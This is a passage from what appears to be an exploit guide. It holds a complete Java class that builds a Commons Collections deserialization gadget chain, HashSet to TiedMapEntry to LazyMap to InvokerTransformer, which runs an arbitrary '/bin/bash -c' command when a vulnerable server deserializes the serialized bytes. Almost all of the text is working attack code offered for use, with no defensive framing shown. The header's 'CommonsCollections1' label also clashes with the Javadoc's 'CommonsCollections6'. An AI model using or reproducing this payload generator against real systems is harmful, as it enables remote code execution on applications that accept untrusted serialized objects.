## 2. Gadget Chain Builder

```java
// GadgetChainBuilder.java - Constructs the CommonsCollections1-style gadget chain
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class GadgetChainBuilder {

    /**
     * Builds a CommonsCollections6-style gadget chain that executes
     * an arbitrary command during deserialization.
     *
     * Chain: HashSet -> HashMap -> TiedMapEntry -> LazyMap ->
     *         ChainedTransformer -> InvokerTransformer -> Runtime.exec()
     */
    public static byte[] buildPayload(String command) throws Exception {
        // Step 1: Build the transformer chain
        // Each transformer feeds its output to the next
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),

            // Runtime.class.getMethod("getRuntime")
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }
            ),

            // Invoke Runtime.getRuntime()
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }
            ),

            // Invoke runtime.exec(command)
            new InvokerTransformer("exec",
                new Class[] { String[].class },
                new Object[] { new String[] { "/bin/bash", "-c", command } }
            )
        };

        // Wrap in ChainedTransformer so each step's output feeds the next
        final ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // Step 2: Create a dummy transformer initially (to avoid premature execution)
        final Transformer dummyTransformer = new ConstantTransformer(1);
        final Map<String, String> innerMap = new HashMap<>();
        final Map lazyMap = LazyMap.decorate(innerMap, dummyTransformer);

        // Step 3: Create TiedMapEntry that will trigger lazyMap.get()
        final TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        // Step 4: Create HashSet whose hash uses the TiedMapEntry
        // HashSet.hashCode() -> entry.hashCode() -> tiedMapEntry.getValue()
        //   -> lazyMap.get("foo") -> chainedTransformer.transform("foo")
        final HashSet set = new HashSet(1);
        set.add("foo");  // placeholder

        // Step 5: Use reflection to swap in our TiedMapEntry
        Field f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);
        HashMap innerSetMap = (HashMap) f.get(set);

        Field f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innerSetMap);

        Object node = array[0];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);

        // Step 6: Now swap the dummy transformer with the real one
        Field f3 = LazyMap.class.getDeclaredField("factory");
        f3.setAccessible(true);
        f3.set(lazyMap, chainedTransformer);

        // Step 7: Serialize the payload
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(set);
        oos.close();

        return bos.toByteArray();
    }
}
